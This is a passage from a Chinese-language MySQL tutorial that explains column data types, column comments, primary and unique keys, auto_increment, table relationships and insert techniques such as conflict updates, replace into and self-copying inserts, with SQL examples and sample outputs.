title="decimal"></a>decimal</h3><p>decimal 定点数：系统自动根据存储的数据来分配存储空间，每大概 9 个数就会分配四个字节进行存储，同时小数和整数部分是分开的</p><p>decimal(M,D)：M 表示总长度，最大值不能超过 65，D 代表小数部分长度，最长不能超过30.</p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">-- 创建表</span><br><span class="line">create table my_decimal(</span><br><span class="line">    f1 float(10,2),</span><br><span class="line">    d1 decimal(10,2)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">-- 插入数据</span><br><span class="line">insert into my_decimal values(12345678.90,12345678.90);</span><br><span class="line">insert into my_decimal values(99999999.99,99999999.99);</span><br><span class="line"></span><br><span class="line">-- 结果</span><br><span class="line">+--------------+-------------+</span><br><span class="line">| f1           | d1          |</span><br><span class="line">+--------------+-------------+</span><br><span class="line">|  12345679.00 | 12345678.90 |</span><br><span class="line">| 100000000.00 | 99999999.99 |</span><br><span class="line">+--------------+-------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h1 id="时间日期类型"><a href="#时间日期类型" class="headerlink" title="时间日期类型"></a>时间日期类型</h1><h2 id="date"><a href="#date" class="headerlink" title="date"></a>date</h2><p>日期类型：系统使用三个字节来存储数据，对应格式为：YYYY-mm-dd，能表示的范围是从 1000-01-01 到 9999-12-12，初始值为 0000-00-00</p><h2 id="time"><a href="#time" class="headerlink" title="time"></a>time</h2><p>时间类型：能够表示某个指定的时间，但是系统同样是提供 3 个字节来存储，对用的格式为：HH:ii:ss，但是 mysql 中的 time 类型能够表示时间范围要大得多，能表示-838:59:59 ~ 838:59:59，在 mysql 中具体用处使用开描述时间段</p><h2 id="datatime"><a href="#datatime" class="headerlink" title="datatime"></a>datatime</h2><p>日期时间类型：就是将 data 和 time 合并起来，表示时间，使用 8 个字节存储数据，格式为 YYYY-mm-dd HH:ii;ss</p><h2 id="year"><a href="#year" class="headerlink" title="year"></a>year</h2><p>年类型：占用 1 个字节来存储数据，能表示 1900<del>2155 年，但是 year 有两种数据插入方式：0</del>99 和四位数的具体年</p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">-- 创建表</span><br><span class="line">create table my_date(</span><br><span class="line">    d1 date,</span><br><span class="line">    d2 time,</span><br><span class="line">    d3 datetime,</span><br><span class="line">    d4 timestamp,</span><br><span class="line">    d5 year</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">-- 插入数据</span><br><span class="line">insert into my_date values(</span><br><span class="line">&#39;1900-01-01&#39;,&#39;12:12:12&#39;,&#39;1900-01-01 12:12:12&#39;,&#39;1999-01-01 12:12:12&#39;,69</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">-- 结果</span><br><span class="line">+------------+----------+---------------------+---------------------+------+</span><br><span class="line">| d1         | d2       | d3                  | d4                  | d5   |</span><br><span class="line">+------------+----------+---------------------+---------------------+------+</span><br><span class="line">| 1900-01-01 | 12:12:12 | 1900-01-01 12:12:12 | 1999-01-01 12:12:12 | 2069 |</span><br><span class="line">+------------+----------+---------------------+---------------------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p><strong>注意：year 进行两位数插入的时候，有一个区间划分，零界点为 69 和 70，当输入69 以下，那么系统时间为 20+数字，如果是 70 以上，那么系统时间为 19+数字</strong></p><h1 id="字符串型"><a href="#字符串型" class="headerlink" title="字符串型"></a>字符串型</h1><h2 id="char"><a href="#char" class="headerlink" title="char"></a>char</h2><p>定长字符：指定长度之后，系统一定会分配指定的空间用于存储数据</p><p>基本语法：char(L)，L 代表<strong>字符数</strong>，长度为 0 ~ 255</p><h2 id="varchar"><a href="#varchar" class="headerlink" title="varchar"></a>varchar</h2><p>变长字符：指定长度之后，系统会根据实际存储的数据计算长度，分配合适的长度（数据没有超出长度）</p><p>基本语法：varchar(L)，L 代表字符数，L的理论值 0~65535</p><h2 id="text"><a href="#text" class="headerlink" title="text"></a>text</h2><p>文本类型：有两种文本类型</p><ol><li>text：存储普通的字符文本</li><li>blob：存储二进制文本（图片，文件），<strong>一般不用这个</strong>，通常使用一个链接指向对应的文件本身</li></ol><p>text：系统中提供四种 text</p><ol><li>tinytext：系统使用一个字节来保存，实际能够存储的数据为：2^8+1</li><li>text：使用两个字节来保存，实际存储为：2^16+2</li><li>mediumtext：使用三个字节来保存，实际存储为：2^24+3</li><li>longtext：使用四个字节保存，时间存储为：2^32+4</li></ol><h2 id="enum"><a href="#enum" class="headerlink" title="enum"></a>enum</h2><p>枚举类型：在数据插入之前，先设定几个项，这几个项就是可能最终出现的数据结果</p><p>基本语法：enum(数据值 1,数据值 2,…)</p><h2 id="set"><a href="#set" class="headerlink" title="set"></a>set</h2><p>集合：将多个数据选项可以同时保存的数据类型，本质是将指定的项按照对应的二进制位来进行控制：<strong>1 表示该选项被选中，0 表示没有被选中</strong></p><p>基本语法：set(‘值 1’,’值 2’,’值 3’,…)</p><p>系统为 set 提供了多个字节进行保存，但是系统会自动计算来选择具体的存储单元</p><p>1 个字节：set 只能有 8 个选项</p><p>2 个字节：set 只能有 16 个选项</p><p>3 个字节：set 只能有 24 个选项</p><p>8 个字节：set 只能有 64 个选项</p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-- 创建表</span><br><span class="line">create table my_set(</span><br><span class="line">hobby set(&#39;篮球&#39;,&#39;足球&#39;,&#39;羽毛球&#39;,&#39;乒乓球&#39;,&#39;网球&#39;,&#39;橄榄球&#39;,&#39;冰球&#39;,&#39;高尔夫球&#39;)</span><br><span class="line">);</span><br><span class="line">-- 插入数据</span><br><span class="line">insert into my_set values(&#39;篮球,足球,乒乓球&#39;);</span><br><span class="line">-- 数据选项所在的数据与数据插入的顺序无关，最终都会变成选项对应的顺序</span><br><span class="line">insert into my_set values(&#39;高尔夫球,篮球,足球,乒乓球&#39;);</span><br><span class="line">-- 结果</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| hobby                                |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| 篮球,足球,乒乓球                     |</span><br><span class="line">| 篮球,足球,乒乓球,高尔夫球            |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p><strong>注意：set 和 enum 一样，最终存储到数据字段中的依然是数字而不是正式的字符串</strong></p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-- 以数值方式查看集合数据</span><br><span class="line">select hobby + 0 from my_set;</span><br><span class="line"></span><br><span class="line">-- 结果</span><br><span class="line">+-----------+</span><br><span class="line">| hobby + 0 |</span><br><span class="line">+-----------+</span><br><span class="line">|        11 |</span><br><span class="line">|       139 |</span><br><span class="line">+-----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>enum：单选框</p><p>set：复选框</p><h1 id="列描述"><a href="#列描述" class="headerlink" title="列描述"></a>列描述</h1><p>列描述：comment，是专门用于给开发人员进行维护的一个注释说明</p><p>基本语法：comment ‘字段描述’;</p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-- 创建表，增加字段描述</span><br><span class="line">create table my_comment(</span><br><span class="line">name varchar(10) not null comment &#39;当前是用户名，不能为空&#39;,</span><br><span class="line">pass varchar(50) not null comment &#39;密码不能为空&#39;</span><br><span class="line">);</span><br><span class="line">-- 查看 comment</span><br><span class="line">+------------+--------------------------------------------------------------------------+</span><br><span class="line">| Table      | Create Table                                                             |</span><br><span class="line">+------------+--------------------------------------------------------------------------+</span><br><span class="line">| my_comment | CREATE TABLE &#96;my_comment&#96; (</span><br><span class="line">  &#96;name&#96; varchar(10) NOT NULL COMMENT &#39;当前是用户名，不能为空&#39;,</span><br><span class="line">  &#96;pass&#96; varchar(50) NOT NULL COMMENT &#39;密码不能为空&#39;</span><br><span class="line">) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8                  |</span><br><span class="line">+------------+--------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure><h1 id="主键"><a href="#主键" class="headerlink" title="主键"></a>主键</h1><p>primary key，在一张表中，有且只有一个字段，里面的只具有唯一性</p><h2 id="创建主键"><a href="#创建主键" class="headerlink" title="创建主键"></a>创建主键</h2><h3 id="随表创建"><a href="#随表创建" class="headerlink" title="随表创建"></a>随表创建</h3><p>系统提供了两种增加主键的方式</p><ol><li>直接在需要当作主键的字段之后增加 primary key 属性来确定主键</li><li>在所有字段之后增加 primary key 选项如：primary key(字段信息)</li></ol><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-- 创建表</span><br><span class="line">-- 1</span><br><span class="line">create table my_pri1(</span><br><span class="line">username varchar(10) primary key</span><br><span class="line">);</span><br><span class="line">-- 2</span><br><span class="line">create table my_pri2(</span><br><span class="line">username varchar(10),</span><br><span class="line">primary key(username)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="表后增加"><a href="#表后增加" class="headerlink" title="表后增加"></a>表后增加</h3><p>基本语法：alter table 表名 add primary key(字段);</p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">-- 创建表</span><br><span class="line">create table my_pri3(</span><br><span class="line">username varchar(10)</span><br><span class="line">);</span><br><span class="line">-- 查看结果</span><br><span class="line">+----------+-------------+------+-----+---------+-------+</span><br><span class="line">| Field    | Type        | Null | Key | Default | Extra |</span><br><span class="line">+----------+-------------+------+-----+---------+-------+</span><br><span class="line">| username | varchar(10) | YES  |     | NULL    |       |</span><br><span class="line">+----------+-------------+------+-----+---------+-------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">-- 增加主键</span><br><span class="line">alter table my_pri3 add primary key(username);</span><br><span class="line">-- 查看结果</span><br><span class="line">+----------+-------------+------+-----+---------+-------+</span><br><span class="line">| Field    | Type        | Null | Key | Default | Extra |</span><br><span class="line">+----------+-------------+------+-----+---------+-------+</span><br><span class="line">| username | varchar(10) | NO   | PRI | NULL    |       |</span><br><span class="line">+----------+-------------+------+-----+---------+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p><strong>注意：主键一定不能为空</strong></p><h2 id="删除主键"><a href="#删除主键" class="headerlink" title="删除主键"></a>删除主键</h2><p>基本语法：alter table 表名 drop primary key;</p><p>注意：删除主键后其他被改变的值不会变为之前的样子如：<strong>my_pri3 中 null 为 no，删除主键后 null 还为 no</strong></p><h1 id="自动增长"><a href="#自动增长" class="headerlink" title="自动增长"></a>自动增长</h1><p>自动增长：auto_increament，当给定某个字段该属性之后，该列的数据在没有提供确定数据的时候，系统会根据之前已经存在的数据进行自动增加，填充数据</p><p><strong>通常用于逻辑主键</strong></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ol><li>在系统中有维护一组数据，用来保存当前使用好了自动增长的字段，记住当前对应的数据值，再给定一个指定的步长</li><li>当用户进行数据插入的时候，如果没有给定值，系统在原始值上再加上步长变成新的数据</li><li>自动增长的触发：给定属性的字段没有提供值</li></ol><p>注意：自动增长只适用于数值</p><h2 id="使用自动增长"><a href="#使用自动增长" class="headerlink" title="使用自动增长"></a>使用自动增长</h2><p>基本语法：在字段后增加一个属性 auto_increment</p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">-- 创建一个自动增长的表</span><br><span class="line">create table my_auto(</span><br><span class="line">id int primary key auto_increment,</span><br><span class="line">name varchar(10),</span><br><span class="line">pass varchar(50)</span><br><span class="line">);</span><br><span class="line">-- 查看属性</span><br><span class="line">+-------+-------------+------+-----+---------+----------------+</span><br><span class="line">| Field | Type        | Null | Key | Default | Extra          |</span><br><span class="line">+-------+-------------+------+-----+---------+----------------+</span><br><span class="line">| id    | int         | NO   | PRI | NULL    | auto_increment |</span><br><span class="line">| name  | varchar(10) | YES  |     | NULL    |                |</span><br><span class="line">| pass  | varchar(50) | YES  |     | NULL    |                |</span><br><span class="line">+-------+-------------+------+-----+---------+----------------+</span><br><span class="line">3 rows in set (0.01 sec)</span><br><span class="line">-- 插入数据：触发自动增长，不给定具体指</span><br><span class="line">insert into my_auto values(null,&#39;Tom&#39;,&#39;123456&#39;);</span><br><span class="line">insert into my_auto values(null,&#39;Jack&#39;,&#39;123456&#39;);</span><br><span class="line">insert into my_auto values(null,&#39;Jane&#39;,&#39;123456&#39;);</span><br><span class="line">--查看数据结果</span><br><span class="line">+----+------+--------+</span><br><span class="line">| id | name | pass   |</span><br><span class="line">+----+------+--------+</span><br><span class="line">|  1 | Tom  | 123456 |</span><br><span class="line">|  2 | Jack | 123456 |</span><br><span class="line">|  3 | Jane | 123456 |</span><br><span class="line">+----+------+--------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="修改自动增长"><a href="#修改自动增长" class="headerlink" title="修改自动增长"></a>修改自动增长</h2><p>基本语法：alter table 表名 auto_increment = 值</p><h2 id="删除自动增长"><a href="#删除自动增长" class="headerlink" title="删除自动增长"></a>删除自动增长</h2><p>删除自动增长，就是在字段属性之后不再保留 auto_increment，当用户修改自增长所在字段时，如果没有看到 auto_increment 属性，系统就会自动清除该自动增长</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-- 删除自增长</span><br><span class="line">alter table my_auto modify id int;</span><br><span class="line">-- 注意：不要再次增加primary key</span><br></pre></td></tr></table></figure><h2 id="初始设置"><a href="#初始设置" class="headerlink" title="初始设置"></a>初始设置</h2><p>在系统中，有一组变量用来维护自增长的初始值和步长</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-- 查看自动增长初始变量</span><br><span class="line">show variables like &#39;auto_increment%&#39;;</span><br><span class="line">-- 结果</span><br><span class="line">+--------------------------+-------+</span><br><span class="line">| Variable_name            | Value |</span><br><span class="line">+--------------------------+-------+</span><br><span class="line">| auto_increment_increment | 1     |-- 步长</span><br><span class="line">| auto_increment_offset    | 1     |-- 初始值</span><br><span class="line">+--------------------------+-------+</span><br><span class="line">2 rows in set, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="细节问题"><a href="#细节问题" class="headerlink" title="细节问题"></a>细节问题</h2><ol><li><strong>一张表只有一个自动增长：自动增长会上升到表选项中</strong></li><li><strong>如果数据插入中没有触发自动增长（给定了数据），你们自动增长不会表现</strong></li><li><strong>自动增长修改的时候，值可以较大，但是不能比当前已有的自动增长字段的值小</strong></li></ol><h1 id="唯一键"><a href="#唯一键" class="headerlink" title="唯一键"></a>唯一键</h1><p>unique key，用来保证对应的字段中的数据唯一</p><p>注意：</p><ol><li><p>唯一键在一张表中可以有多个</p></li><li><p>唯一键允许字段数据为 null，null 库有多个（null 不参与比较）</p></li></ol><h2 id="创建唯一键"><a href="#创建唯一键" class="headerlink" title="创建唯一键"></a>创建唯一键</h2><p>创建唯一键与创建主键非常类似</p><ol><li><p>直接再表字段之后增加唯一键标识符：unique [key]</p></li><li><p>再所有的字段后使用 unique key(字段列表)</p></li><li><p>在创建完表之后也可以增加唯一键</p><p>alter table 表名 add unique key(字段列表)</p></li></ol><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-- 创建表</span><br><span class="line">create table my_unique1(</span><br><span class="line">id int primary key auto_increment,</span><br><span class="line">username varchar(10) unique key</span><br><span class="line">);</span><br><span class="line">---------------------------------</span><br><span class="line">create table my_unique2(</span><br><span class="line">id int primary key auto_increment,</span><br><span class="line">username varchar(10),</span><br><span class="line">unique key(username)</span><br><span class="line">);</span><br><span class="line">--------------------------------</span><br><span class="line">create table my_unique3(</span><br><span class="line">id int primary key auto_increment,</span><br><span class="line">username varchar(10)</span><br><span class="line">);</span><br><span class="line">alter table my_unique3 add unique key(username);</span><br></pre></td></tr></table></figure><h2 id="查看唯一键"><a href="#查看唯一键" class="headerlink" title="查看唯一键"></a>查看唯一键</h2><p>唯一键是属性，可以通过查看表结构来实现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-- 查看</span><br><span class="line">desc my_unique1</span><br><span class="line">-- 结果</span><br><span class="line">+----------+-------------+------+-----+---------+----------------+</span><br><span class="line">| Field    | Type        | Null | Key | Default | Extra          |</span><br><span class="line">+----------+-------------+------+-----+---------+----------------+</span><br><span class="line">| id       | int         | NO   | PRI | NULL    | auto_increment |</span><br><span class="line">| username | varchar(10) | YES  | UNI | NULL    |                |</span><br><span class="line">+----------+-------------+------+-----+---------+----------------+</span><br><span class="line">2 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>唯一键效果：再不为空的情况下，不允许重复</p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-- 插入多个为空数据</span><br><span class="line">insert into my_unique1 values(null,null);</span><br><span class="line">insert into my_unique1 values(null,null);</span><br><span class="line">insert into my_unique1 values(null,null);</span><br><span class="line">-- 查看数据</span><br><span class="line">+----+----------+</span><br><span class="line">| id | username |</span><br><span class="line">+----+----------+</span><br><span class="line">|  1 | NULL     |</span><br><span class="line">|  2 | NULL     |</span><br><span class="line">|  3 | NULL     |</span><br><span class="line">+----+----------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line">-- 发现 null 能重复</span><br><span class="line">-- 插入多个非空相同的数据</span><br><span class="line">insert into my_unique1 values(null,&#39;anmi&#39;);</span><br><span class="line">insert into my_unique1 values(null,&#39;anmi&#39;);</span><br><span class="line">-- 插入第二个时出现错误</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#39;anmi&#39; for key &#39;my_unique1.username&#39;</span><br></pre></td></tr></table></figure><h2 id="删除唯一键"><a href="#删除唯一键" class="headerlink" title="删除唯一键"></a>删除唯一键</h2><p>基本语法：<strong>alter table 表名 drop index 唯一键名字;                        // 唯一键名字默认与字段名相同</strong></p><h2 id="复合唯一键"><a href="#复合唯一键" class="headerlink" title="复合唯一键"></a>复合唯一键</h2><p>唯一键与主键一样可以使用多个字段共同保证唯一性</p><p><strong>注意：一般主键都是单一字段（逻辑主键），而其他需要唯一性的内容都是由唯一键来处理</strong></p><h1 id="表关系"><a href="#表关系" class="headerlink" title="表关系"></a>表关系</h1><h2 id="一对一"><a href="#一对一" class="headerlink" title="一对一"></a>一对一</h2><p>一对一：一张表中的一条记录与另一张表中最多有一条明确的关系</p><p>通常，此设计方案保障两张表中使用相同的主键即可</p><h2 id="一对多"><a href="#一对多" class="headerlink" title="一对多"></a>一对多</h2><p>一对多，通常也叫作多对一的关系，</p><p>通常一对多的关系设计方案，再多关系的表中去维护一个字段</p><h2 id="多对多"><a href="#多对多" class="headerlink" title="多对多"></a>多对多</h2><p>多对多：一张表中的一条记录在另外一张表中可以匹配到多条记录，反之也可以</p><p>多对多的关系如果按照多对一的关系维护：就会出现一个字段中有多个其他表的主键，在访问的时候就会带来不便</p><p>如 师生关系</p><ol><li>一个老师教过多个班级的学生</li><li>一个学生听过多个老师讲的课</li></ol><p>关系如下图所示：</p><p><img src= "/img/loading.gif" data-lazy-src="https://s3.ax1x.com/2021/02/05/y8lzTA.png" alt="师生关系"></p><p><strong>多对多的解决方案：增加一个中间表，让中间表与对应的其他表形成两个多对一多关系：多对一的决绝方案是在 ”多“ 表中增加 “一” 表对应的字段</strong></p><h1 id="高级数据操作"><a href="#高级数据操作" class="headerlink" title="高级数据操作"></a>高级数据操作</h1><h2 id="新增数据"><a href="#新增数据" class="headerlink" title="新增数据"></a>新增数据</h2><h3 id="多数据插入"><a href="#多数据插入" class="headerlink" title="多数据插入"></a>多数据插入</h3><p>只要写一次 insert 指令，但是可以直接插入多条记录</p><p>基本语法：insert into 表名 [(字段列表)] values(值列表),(值列表)…;</p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-- 创建表</span><br><span class="line">create table test(</span><br><span class="line">name varchar(10)</span><br><span class="line">);</span><br><span class="line">-- 插入数据</span><br><span class="line">insert into test values(&#39;Tom&#39;),(&#39;Anmi&#39;),(&#39;Peter&#39;);</span><br><span class="line">-- 查看数据</span><br><span class="line">+-------+</span><br><span class="line">| name  |</span><br><span class="line">+-------+</span><br><span class="line">| Tom   |</span><br><span class="line">| Anmi  |</span><br><span class="line">| Peter |</span><br><span class="line">+-------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="主键冲突"><a href="#主键冲突" class="headerlink" title="主键冲突"></a>主键冲突</h3><p>主键冲突：再有的表中，使用的是业务主键（字段有业务含义），但是往往在进行数据插入的时候，有不确定数据表中是否已经存在对应的主键</p><p>解决方案：</p><ol><li><p>主键冲突更新</p><p>类似插入数据语法，如果插入的过程中主键冲突，那么采用此更新方法</p><p>insert into 表名 [(字段列表)] values(值列表) on duplocate key update 字段 = 新值</p></li></ol><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">-- 创建表</span><br><span class="line">create table my_student(</span><br><span class="line">std_id varchar(10) primary key comment &#39;主键，学生ID&#39;,</span><br><span class="line">std_name varchar(10) not null comment &#39;学生姓名&#39;</span><br><span class="line">);</span><br><span class="line">-- 插入数据</span><br><span class="line">insert into my_student values</span><br><span class="line">(&#39;std00001&#39;,&#39;张三&#39;),</span><br><span class="line">(&#39;std00002&#39;,&#39;张四&#39;),</span><br><span class="line">(&#39;std00003&#39;,&#39;张五&#39;),</span><br><span class="line">(&#39;std00004&#39;,&#39;张六&#39;),</span><br><span class="line">(&#39;std00005&#39;,&#39;张七&#39;);</span><br><span class="line">-- 冲突更新</span><br><span class="line">insert into my_student values(&#39;std00004&#39;,&#39;小明&#39;) on duplicate key update std_name &#x3D; &#39;小明&#39;; </span><br><span class="line">-- 结果</span><br><span class="line">+----------+----------+</span><br><span class="line">| std_id   | std_name |</span><br><span class="line">+----------+----------+</span><br><span class="line">| std00001 | 张三     |</span><br><span class="line">| std00002 | 张四     |</span><br><span class="line">| std00003 | 张五     |</span><br><span class="line">| std00004 | 小明     |</span><br><span class="line">| std00005 | 张七     |</span><br><span class="line">+----------+----------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><ol start="2"><li><p>主键冲突替换</p><p>当主键冲突之后，干掉原来的数据，重新插入禁区</p><p>replace into [(字段列表)] values(值列表);</p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">replace into my_student values(&#39;std00001&#39;,&#39;李华&#39;);</span><br><span class="line">-- 结果</span><br><span class="line">+----------+----------+</span><br><span class="line">| std_id   | std_name |</span><br><span class="line">+----------+----------+</span><br><span class="line">| std00001 | 李华     |</span><br><span class="line">| std00002 | 张四     |</span><br><span class="line">| std00003 | 张五     |</span><br><span class="line">| std00004 | 小明     |</span><br><span class="line">| std00005 | 张七     |</span><br><span class="line">+----------+----------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="蠕虫复制"><a href="#蠕虫复制" class="headerlink" title="蠕虫复制"></a>蠕虫复制</h2><p>蠕虫复制：一分为二，成倍的增加。从已有的数据中获取数据，并且将后取得数据插入到下数据表中</p><p>基本语法：insert into [(字段列表)] select */字段列表 from 表;</p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-- 创建表 并插入数据</span><br><span class="line">create table my_simple(</span><br><span class="line">name char(1) not null</span><br><span class="line">);</span><br><span class="line">insert into my_simple values(&#39;a&#39;),(&#39;b&#39;),(&#39;c&#39;),(&#39;d&#39;);</span><br><span class="line">-- 蠕虫复制</span><br><span class="line">insert into my_simple(name) select name from 